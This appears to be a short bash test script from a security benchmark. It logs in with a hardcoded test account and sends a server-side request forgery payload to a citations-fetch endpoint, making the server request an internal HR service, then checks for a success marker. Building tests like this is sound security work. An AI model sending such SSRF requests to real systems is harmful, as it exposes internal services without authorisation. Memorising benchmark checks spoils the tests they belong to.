#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
auth_json -X POST "$TARGET/api/citations/fetch" -d '{"url":"http://internal-svc:9099/hr"}' | grep -q 'INTERNAL-HR-SSRF-OK'
